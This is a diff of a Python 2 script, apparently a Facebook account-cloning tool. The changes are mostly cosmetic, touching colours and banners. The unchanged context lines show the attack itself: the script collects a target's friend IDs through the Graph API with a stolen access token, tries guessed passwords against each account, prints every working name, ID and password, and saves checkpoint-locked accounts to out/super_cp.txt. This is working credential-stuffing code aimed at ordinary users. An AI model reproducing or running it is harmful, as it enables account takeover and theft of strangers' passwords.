@@ -375,7 +375,7 @@ def pilih_super():
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
-		print "\033[1;95m«-----------------\033[1;91mKali.linux\033[1;95m-----------------»"
+		print "\033[1;95m•-----------------\033[1;34mKali.linux\033[1;92m-----------------•"
 		print logo
 		jalan('\033[1;93mGetting Accounts \033[1;93m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
@@ -384,7 +384,7 @@ def pilih_super():
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
-		print "\033[1;95m«-----------------\033[1;91mKali.linux\033[1;95m-----------------»"
+		print "\033[1;92m•-----------------\033[1;34mKali.linux\033[1;92m-----------------•"
 		print logo
 		idt = raw_input("\033[1;96m[*] \033[1;92mEnter ID\033[1;93m: \033[1;97m")
 		try:
@@ -395,7 +395,7 @@ def pilih_super():
 			print"\x1b[1;92mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		print"\033[1;93mGetting Accounts\033[1;93m..."
+		print"\033[1;97m[+]\033[1;97mGetting Accounts\033[1;93m..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -406,13 +406,12 @@ def pilih_super():
 		print "\x1b[1;91mFill in correctly"
 		pilih_super()
 	
-	print "\033[1;93mTotal Accounts\033[1;93m: \033[1;97m"+str(len(id))
-	jalan('\033[1;93mWait\033[1;97m...')
+	print "\033[1;97m[+]\033[1;91mTotal Accounts\033[1;93m: \033[1;97m"+str(len(id))
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;93m•Cloning Has Been Started•\033[1;93m"+o),;sys.stdout.flush();time.sleep(0.05)
 	print "\n\033[1;92mNOTE:\x1b[1;93m [If You Want to Stop Process Press CTRL+Z]"
-	print "\033[1;95m«-----------------\033[1;91mKali.linux\033[1;95m-----------------»"
+	print "\033[1;92m•-----------------\033[1;34mKali.linux\033[1;92m-----------------•"
  	
 			
 	def main(arg):
@@ -432,8 +431,8 @@ def pilih_super():
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				z = json.loads(x.text)
 				print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
-				print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;91m' + b['name']											
-				print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;91m' + user											
+				print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
+				print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user											
 				print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass1 + '\n'											
 				oks.append(user+pass1)
                         else:
@@ -455,7 +454,7 @@ def pilih_super():
 				            z = json.loads(x.text)
 				            print '\x1b[1;97m[!] \x1b[1;92m[OK]'											
 				            print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']											
-				            print '\x1b[1;91m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;91m' + user								
+				            print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;91m' + user								
 				            print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass2 + '\n'											
 				            oks.append(user+pass2)
                                     else:
@@ -506,7 +505,7 @@ def pilih_super():
 			                                           if 'www.facebook.com' in q["error_msg"]:
 				                                       print '\x1b[1;97m[!] \x1b[1;96m[Checkpoint]'
 				                                       print '\x1b[1;97m[!] \x1b[1;97mName \x1b[1;97m    : \x1b[1;97m' + b['name']
-				                                       print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;93m' + user
+				                                       print '\x1b[1;97m[!] \x1b[1;97mID \x1b[1;97m      : \x1b[1;97m' + user
 				                                       print '\x1b[1;97m[!] \x1b[1;97mPassword \x1b[1;97m: \x1b[1;97m' + pass4 + '\n'
 				                                       cek = open("out/super_cp.txt", "a")
 				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
